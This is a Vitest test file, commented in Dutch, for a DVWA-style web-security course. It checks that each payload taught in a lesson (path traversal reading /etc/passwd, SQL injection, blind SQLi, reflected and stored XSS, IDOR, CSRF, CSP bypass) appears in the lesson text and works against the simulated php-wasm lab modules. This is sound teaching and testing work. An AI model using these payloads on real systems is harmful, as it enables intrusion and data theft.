import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { beforeEach, describe, expect, it } from 'vitest';
import { createPhp, execPhp } from '../components/DvwaLab/PhpWasmProvider';
import { authorizationBypass } from '../components/DvwaLab/modules/authorization_bypass';
import { cspBypass } from '../components/DvwaLab/modules/csp_bypass';
import { csrf } from '../components/DvwaLab/modules/csrf';
import { fileInclusion } from '../components/DvwaLab/modules/file_inclusion';
import { sqlInjection } from '../components/DvwaLab/modules/sql_injection';
import { sqlInjectionBlind } from '../components/DvwaLab/modules/sql_injection_blind';
import { xssReflected } from '../components/DvwaLab/modules/xss_reflected';
import { xssStored } from '../components/DvwaLab/modules/xss_stored';

// Bewaakt de belofte die de rest van de cursus niet test: dat de payload die
// een les een leerling láát intypen, in het lab ook echt de beloofde uitkomst
// geeft. Elke case doet twee dingen:
//
//   1. de payload-string staat letterlijk in de bijbehorende .mdx — zo kan een
//      les zijn payload niet wijzigen zonder dat deze test (en dus de
//      module-check eronder) meebeweegt;
//   2. diezelfde payload door de échte php-wasm-module gedraaid geeft de
//      uitkomst die de les belooft.
//
// Zo lopen les en lab niet stil uit elkaar: precies de klasse fouten die een
// handmatige review anders moet vangen (een payload die de module niet meer
// ondersteunt, of een les die iets anders belooft dan de module doet).

const DOCS = join(
  fileURLToPath(new URL('.', import.meta.url)),
  '..',
  '..',
  'docs',
  'dvwa_tutorial',
);

const MODULES: Record<string, Record<string, { method: string; php: string }>> = {
  sql_injection: sqlInjection,
  sql_injection_blind: sqlInjectionBlind,
  file_inclusion: fileInclusion,
  xss_reflected: xssReflected,
  xss_stored: xssStored,
  authorization_bypass: authorizationBypass,
  csrf,
  csp_bypass: cspBypass,
};

type Geval = {
  map: string; // challengemap onder docs/dvwa_tutorial/
  bestand: string; // low.mdx | medium.mdx | high.mdx
  module: string;
  level: 'low' | 'medium' | 'high' | 'impossible';
  payloadInLes: string; // moet letterlijk in map/bestand voorkomen
  invoer: Record<string, string>;
  verwacht: { bevat?: string[]; bevatNiet?: string[] };
};

const GEVALLEN: Geval[] = [
  // --- File Inclusion: traversal / filter-bypass / file:// ---
  {
    map: '10-file-inclusion',
    bestand: 'low.mdx',
    module: 'file_inclusion',
    level: 'low',
    payloadInLes: '../../../../../../../../etc/passwd',
    invoer: { page: '../../../../../../../../etc/passwd' },
    verwacht: { bevat: ['root:x:0:0'] },
  },
  {
    map: '10-file-inclusion',
    bestand: 'medium.mdx',
    module: 'file_inclusion',
    level: 'medium',
    payloadInLes: '....//....//....//....//etc/passwd',
    invoer: { page: '....//....//....//....//etc/passwd' },
    verwacht: { bevat: ['root:x:0:0'] },
  },
  {
    map: '10-file-inclusion',
    bestand: 'high.mdx',
    module: 'file_inclusion',
    level: 'high',
    payloadInLes: 'file:///etc/passwd',
    invoer: { page: 'file:///etc/passwd' },
    verwacht: { bevat: ['root:x:0:0'] },
  },

  // --- SQL Injection ---
  {
    map: '04-sql-injection',
    bestand: 'low.mdx',
    module: 'sql_injection',
    level: 'low',
    payloadInLes: "1' OR '1'='1",
    invoer: { id: "1' OR '1'='1" },
    verwacht: { bevat: ['admin', 'Gordon'] },
  },
  {
    map: '04-sql-injection',
    bestand: 'medium.mdx',
    module: 'sql_injection',
    level: 'medium',
    payloadInLes: '1 OR 1=1',
    invoer: { id: '1 OR 1=1' },
    verwacht: { bevat: ['admin', 'Gordon'] },
  },
  {
    map: '04-sql-injection',
    bestand: 'high.mdx',
    module: 'sql_injection',
    level: 'high',
    payloadInLes: "1' OR '1'='1' -- ",
    invoer: { id: "1' OR '1'='1' -- " },
    verwacht: { bevat: ['admin', 'Gordon'] },
  },

  // --- Blind SQL Injection: boolean-based ---
  {
    map: '05-sql-injection-blind',
    bestand: 'low.mdx',
    module: 'sql_injection_blind',
    level: 'low',
    payloadInLes: "1' AND '1'='1",
    invoer: { id: "1' AND '1'='1" },
    verwacht: { bevat: ['bestaat'], bevatNiet: ['bestaat niet'] },
  },
  {
    map: '05-sql-injection-blind',
    bestand: 'low.mdx',
    module: 'sql_injection_blind',
    level: 'low',
    payloadInLes: "1' AND '1'='2",
    invoer: { id: "1' AND '1'='2" },
    verwacht: { bevat: ['bestaat niet'] },
  },

  // --- XSS Reflected ---
  {
    map: '06-xss-reflected',
    bestand: 'low.mdx',
    module: 'xss_reflected',
    level: 'low',
    payloadInLes: '<script>alert(1);</script>',
    invoer: { name: '<script>alert(1);</script>' },
    verwacht: { bevat: ['<script>alert(1);</script>'] },
  },
  {
    map: '06-xss-reflected',
    bestand: 'high.mdx',
    module: 'xss_reflected',
    level: 'high',
    payloadInLes: '<img src=x onerror=alert("hacked")>',
    invoer: { name: '<img src=x onerror=alert("hacked")>' },
    verwacht: { bevat: ['<img src=x onerror=alert("hacked")>'] },
  },

  // --- XSS Stored: raw comment (low), case-bypass on the name (medium) ---
  {
    map: '07-xss-stored',
    bestand: 'low.mdx',
    module: 'xss_stored',
    level: 'low',
    payloadInLes: '<script>alert(1);</script>',
    invoer: { name: 'Jan', mtxMessage: '<script>alert(1);</script>' },
    verwacht: { bevat: ['<script>alert(1);</script>'] },
  },
  {
    map: '07-xss-stored',
    bestand: 'medium.mdx',
    module: 'xss_stored',
    level: 'medium',
    payloadInLes: '<SCRIPT>alert(1);</SCRIPT>',
    invoer: { name: '<SCRIPT>alert(1);</SCRIPT>', mtxMessage: 'hoi' },
    verwacht: { bevat: ['<SCRIPT>alert(1);</SCRIPT>'] },
  },

  // --- Authorization Bypass: IDOR naar admin (ID 1) ---
  {
    map: '03-authorization-bypass',
    bestand: 'low.mdx',
    module: 'authorization_bypass',
    level: 'low',
    payloadInLes: 'ID `1`',
    invoer: { id: '1' },
    verwacht: { bevat: ['supersecret123'] },
  },

  // --- CSRF: wachtwoord wijzigen via GET ---
  {
    map: '09-csrf',
    bestand: 'low.mdx',
    module: 'csrf',
    level: 'low',
    payloadInLes: 'password_new=hacked',
    invoer: { password_new: 'hacked', password_conf: 'hacked' },
    verwacht: { bevat: ['gewijzigd'] },
  },

  // --- CSP Bypass (gesimuleerd): whitelist-misbruik en JSONP-callback ---
  {
    map: '13-csp-bypass',
    bestand: 'low.mdx',
    module: 'csp_bypass',
    level: 'low',
    payloadInLes: 'pastebin.com/raw/JOUW_ID',
    invoer: { include: 'https://pastebin.com/raw/JOUW_ID' },
    // 'uitgevoerd' staat alleen in de succes-tak, niet in de statische
    // paginatekst (waar 'whitelist' óók voorkomt).
    verwacht: { bevat: ['uitgevoerd'] },
  },
  {
    map: '13-csp-bypass',
    bestand: 'high.mdx',
    module: 'csp_bypass',
    level: 'high',
    payloadInLes: 'alert(1);//',
    invoer: { include: 'alert(1);//' },
    // De volledige geëchode JSONP-uitvoer; 'alert(1);//' alleen staat óók in
    // de form-placeholder en zou dus ook zonder aanval matchen.
    verwacht: { bevat: ['alert(1);//({"answer":"15"});'] },
  },
];

let php: Awaited<ReturnType<typeof createPhp>>;

describe('les ↔ lab: elke gedocumenteerde payload klopt met de module', () => {
  beforeEach(async () => {
    php = await createPhp(async () => {
      const { PhpNode } = await import('php-wasm/PhpNode.mjs');
      return new PhpNode();
    });
  }, 60_000);

  it.each(GEVALLEN)('$map/$bestand — payload "$payloadInLes"', async (g) => {
    // 1. De payload staat letterlijk in de les (les kan niet stil wegdriften).
    const les = readFileSync(join(DOCS, g.map, g.bestand), 'utf8');
    expect(les, `${g.map}/${g.bestand} bevat de payload niet`).toContain(g.payloadInLes);

    // 2. Diezelfde payload geeft in de module de beloofde uitkomst.
    const config = MODULES[g.module][g.level];
    const get = config.method === 'GET' ? g.invoer : {};
    const post = config.method === 'POST' ? g.invoer : {};
    const uit = await execPhp(php, config.php, get, post);
    for (const s of g.verwacht.bevat ?? []) expect(uit, g.payloadInLes).toContain(s);
    for (const s of g.verwacht.bevatNiet ?? []) expect(uit, g.payloadInLes).not.toContain(s);
  });
});
